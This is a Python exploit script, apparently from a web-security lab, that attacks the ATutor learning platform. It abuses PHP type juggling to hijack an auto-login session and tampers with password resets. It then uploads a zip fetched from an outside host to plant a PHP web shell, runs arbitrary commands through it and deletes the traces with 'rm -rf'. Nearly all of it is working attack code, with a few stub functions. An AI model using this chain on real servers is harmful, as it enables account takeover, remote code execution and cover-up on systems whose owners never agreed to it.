import hashlib, string, itertools, re, requests, sys
from collections import OrderedDict
from urllib.parse import urlencode, quote_plus
#from bs4 import BeautifulSoup
from datetime import datetime
from zipfile import ZipFile 

cmd = sys.argv[3]
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'}
url = sys.argv[1]
def generateEmail(): 
	member_id = "1"
	creation_date = "2019-10-27 17:51:05" # change the creation date based on your 
	email = sys.argv[2]
	charset = string.ascii_lowercase + string.digits
	for word in map(''.join, itertools.product(charset, repeat=5)):
		elist = word +"@" + email  + creation_date + member_id
		hash= hashlib.md5(elist.encode()).hexdigest()[:10]
		if re.match(r'0+[eE]+\d+$', hash):
			print("[*] Exploiting Type Juggling Vuln......")
			print("[*] Generating email: {}@{}".format(word,email))
			break
	return word+"@"+email

def updateEmail(): # Type Juggling vuln 1
	pass

def autologin(): # Type Juggling vuln 2
	mail = generateEmail()
	exploiturl = "http://{}/confirm.php?e={}&id=1&m=1&auto_login&member_id=3&code=0".format(url,mail)
	autologin_request = requests.get(exploiturl, headers=headers, allow_redirects=False)
	first_cookie = autologin_request.headers['Set-Cookie'].split(";")[1].split("=")[2]
	cookieurl = "http://{}/bounce.php?course=1".format(url)
	cookie_data = {"ATutorID":first_cookie}
	cookieurl_request =  requests.get(cookieurl, headers=headers, cookies= cookie_data, allow_redirects=True)
	cookie = cookieurl_request.headers['Set-Cookie'].split(";")[0].split("=")[1]
	print("[*] Got User Cookie: {}".format(cookie))
	return cookie

def resetpassword(): # Tac-Tou vuln
	id = sys.argv[2]
	plainpass = sys.argv[3]
	password = hashlib.sha1(plainpass.encode()).hexdigest()
	print("[*] password in sha1 format {}".format(password))
	now = datetime.now()
	seconds = now.timestamp()
	current = (int)(((seconds/60)/60)/24)
	print("[*] Remote Reset password.......")
	exploiturl = "http://{}/password_reminder.php".format(url)
	data = {
	'form_change': 'true',
	'id': id,
	'g' : current,
	'h' : '1',
	'password_error': '',
	'form_password_hidden': password,
	'password1': '',
	'password2': '',
	'submit': 'Submit'
	}
	resetpassword_request = requests.post(exploiturl, data = data)
	print("[*] Exploit Success.....")

def login():
	plainpass = "Aakyawmin&1"
	url = "http://192.168.175.136/AWAE/ATutor/login.php"
	data = {
	"form_password_hidden": ''
	}

def shell():
	clean_para = "rm -rf ../../asdf_-_asdf*"
	print()
	print("[*] Remote command....")
	shellurl = "http://{}/content/1/asdf_-_asdf/real/test.Php?cmd={}".format(url, cmd)	
	cleanurl = "http://{}/content/1/asdf_-_asdf/real/test.Php?cmd={}".format(url, quote_plus(clean_para))
	shellrequest = requests.get(shellurl)
	print(shellrequest.text)
	print()
	print("[*] Cleaning Foothole.....")
	requests.get(cleanurl)

def uploadzip(): #RCE
	referer = "http://{}/mods/_core/imscp/index.php".format(url)
	zipurl = "http://{}/mods/_core/imscp/ims_import.php".format(url)
	header  = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0', 
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
	cookie = autologin()
	cookie = {"ATutorID":cookie}
	fileobj = open('real.zip', 'rb')
	print()
	print("[*] Exploiting LFI ......")
	print("[*] Uploading zip")
	# r = requests.post('http://127.0.0.1:8080/AWAE/ATutor/mods/_core/imscp/ims_import.php', data={"cid": "0", "allow_test_import": "on", "allow_a4a_import": "on", "filename":"test.zip"}, files={"file": ("test.zip", fileobj)},cookies= cookie)
	data = {"cid": (None, '0'), 
		    "allow_test_import": (None, 'on'), 
		    "allow_a4a_import": (None, 'on'), 
		    "file":'test.zip',
		    "url":(None, 'http://192.168.1.9/real.zip'), 
		    "submit":(None, 'Import')}
	r = requests.post(zipurl, headers=header, files=data,cookies= cookie)
	print("[*] Done")
	shell()

uploadzip()
